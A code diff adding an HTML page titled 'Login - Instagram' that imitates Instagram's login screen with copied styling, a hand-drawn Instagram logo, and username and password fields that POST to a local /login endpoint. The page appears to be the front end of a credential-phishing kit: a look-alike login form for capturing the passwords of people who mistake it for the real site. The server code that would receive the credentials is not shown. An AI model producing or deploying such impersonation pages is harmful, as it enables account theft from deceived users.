@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #fff;
+            padding: 40px 32px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            width: 100%;
+            max-width: 380px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo svg {
+            width: 180px;
+            height: auto;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 8px;
+        }
+        .login-btn:hover {
+            background: #0077c2;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider span {
+            padding: 0 18px;
+        }
+        .links {
+            text-align: center;
+            font-size: 14px;
+        }
+        .links a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .signup-box {
+            margin-top: 20px;
+            text-align: center;
+            padding: 20px 0;
+            border-top: 1px solid #dbdbdb;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+        .error-msg {
+            color: #ed4956;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 8px;
+            display: none;
+        }
+        @media (max-width: 480px) {
+            .container {
+                border: none;
+                background: transparent;
+                padding: 20px;
+            }
+            body {
+                background: #fff;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <text x="0" y="45" font-family="-apple-system, BlinkMacSystemFont, sans-serif" font-size="40" font-weight="700" fill="#262626">Instagram</text>
+                <circle cx="175" cy="22" r="18" fill="none" stroke="#262626" stroke-width="3"/>
+                <circle cx="175" cy="22" r="7" fill="none" stroke="#262626" stroke-width="3"/>
+                <line x1="191" y1="6" x2="191" y2="6" stroke="#262626" stroke-width="2"/>
+            </svg>
+        </div>
+        <form id="loginForm" method="POST" action="/login">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+            <div class="divider"><span>OR</span></div>
+            <div class="links">
+                <a href="#">Forgot password?</a>
+            </div>
+        </form>
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = this.querySelector('.login-btn');
+            btn.textContent = 'Logging in...';
+            btn.disabled = true;
+        });
+    </script>
+</body>
+</html>
